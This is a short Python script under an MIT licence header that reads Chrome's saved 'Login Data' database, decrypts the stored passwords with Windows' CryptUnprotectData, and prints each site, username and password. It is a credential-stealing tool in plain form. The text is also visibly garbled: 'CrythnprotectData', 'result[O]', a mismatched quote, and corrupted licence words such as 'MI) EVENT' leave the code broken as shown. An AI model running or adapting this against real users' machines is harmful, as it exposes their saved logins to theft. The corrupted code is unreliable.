#The MIT License (MIT)
# Copyright (c) 2012 Jordan Wright (jordan-wright.github.io>

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do 50, subject to the following conditions:

######

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

##

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT MT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN MI) EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.

#######

from os import getenv
import sqlite3
import win32crypt

# Connect to the Database
conn = sqlite3.connect(getenv("APPDATA") + '\..\Local\Google\Chrome\User Data\Default\Login Data”)
cursor = conn.cursor()
# Get the results
cursor.execute('SELECT action_url, username_value, password_value FROM logins')
for result in cursor.fetchall():
  # Decrypt the Password
    password = win32crypt.CrythnprotectData(result[2], None, None, None, 0)[1]
    if password:
        print 'Site: ' + result[O]
        print 'Username: ' + result[1]
        print 'Password: ' + password

